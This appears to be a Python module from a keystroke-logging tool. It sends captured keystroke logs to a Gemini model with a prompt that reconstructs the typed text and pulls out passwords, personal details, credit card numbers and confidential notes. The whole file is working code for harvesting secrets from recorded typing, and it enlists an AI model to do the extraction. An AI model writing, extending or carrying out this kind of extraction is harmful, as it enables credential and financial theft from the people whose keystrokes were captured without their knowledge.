import os
import google.generativeai as genai
from dotenv import load_dotenv

load_dotenv()

GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
if GOOGLE_API_KEY:
    genai.configure(api_key=GOOGLE_API_KEY)


def analyze_keystrokes(keystrokes: str) -> str:
    """Run the keystrokes through the Gemini model and return the parsed text."""
    try:
        model = genai.GenerativeModel('gemini-1.5-flash')
        prompt = (
            "Analyze the following keystroke log for sensitive information and "
            "interpret the typing process to simulate the final intended text. "
            "Ensure correct handling of capitalization: recognize when caps lock "
            "is toggled on/off and when shift is held down to capitalize letters. "
            "Disregard all non-printing keystrokes, including backspace, arrow "
            "keys, modifier keys, and function keys.\n\n"
            "In addition, highlight and extract sensitive information, including "
            "but not limited to passwords, personal information, credit card "
            "numbers, confidential notes, code snippets, and website links.\n\n"
            "Display code or software-related patterns distinctly for clarity.\n\n"
            "Keystroke Log:\n{keystrokes}"
        )
        response = model.generate_content(prompt.format(keystrokes=keystrokes))
        return response.text.strip()
    except Exception as e:
        error_message = f"Error during AI analysis: {e}"
        print(error_message)
        return error_message
